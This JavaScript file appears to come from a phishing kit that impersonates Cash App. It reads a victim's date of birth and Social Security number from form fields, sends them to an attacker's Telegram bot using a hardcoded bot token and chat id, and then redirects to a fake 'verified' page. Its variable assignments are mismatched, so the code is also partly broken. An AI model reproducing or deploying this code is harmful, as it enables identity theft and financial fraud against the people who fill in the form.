//bot token
var telegram_bot_id = "6802693422:AAHswa3iATxJ2hAw76Rilwd8dC6f4WYqySM";
//chat id
var chat_id = 6195480252;
var u_dob, u_ssn, u_confirmssn, message;
var ready = function () {
    u_address = document.getElementById("dob").value;
    u_city = document.getElementById("SSN").value;
    u_zipcode = document.getElementById("confirmSSN").value;
    message = "CashAppDOB: " + u_dob + "\nCashAppSSN: " + u_ssn + "\nCashAppSSN2: " + u_confirmssn;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = 'verified.html';
    });
    document.getElementById("dob").value = "";
    document.getElementById("SSN").value = "";
    document.getElementById("confirmSSN").value = "";
    return false;
};